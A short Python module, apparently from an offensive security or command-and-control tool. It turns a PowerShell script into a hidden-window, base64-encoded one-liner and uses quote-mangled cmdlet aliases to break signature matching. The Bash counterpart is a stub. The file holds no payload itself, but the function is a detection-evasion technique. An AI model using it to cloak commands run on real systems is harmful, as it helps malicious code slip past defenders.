from base64 import b64encode
from random import randint, choice


def obfuscate_ps1(code):
    ran1, ran2, ran3 = 'P4j', 'X5x', '5x4'

    encoded_script = b64encode(code.encode('utf_16_le'))
    random_range = randint(4000, 5000)
    random_logic = [encoded_script[i: i + random_range] for i in range(0, len(encoded_script), random_range)]
    empty_string = ''
    c = 0
    for r in random_logic:
        r = (r.rstrip())
        if c > 0:
            empty_string = empty_string + '+'
            empty_string = empty_string + "'"
        ascii_representation = r.decode('ascii') + "'"
        empty_string = empty_string + ascii_representation
        empty_string = empty_string.replace("==", "'+'==")
        c = 1
    mangle_quotes = (choice(["''"]))
    return '''powershell /w 1 /C "s%sv %s -;s%sv %s e%sc;s%sv %s ((g%sv %s).value.toString()+(g%sv %s).value.toString());powershell (g%sv %s).value.toString() %s)''' % (mangle_quotes, ran1, mangle_quotes, ran2, mangle_quotes, mangle_quotes, ran3, mangle_quotes, ran1, mangle_quotes, ran2, mangle_quotes, ran3, empty_string)


def obfuscate_bash(code):
    return code
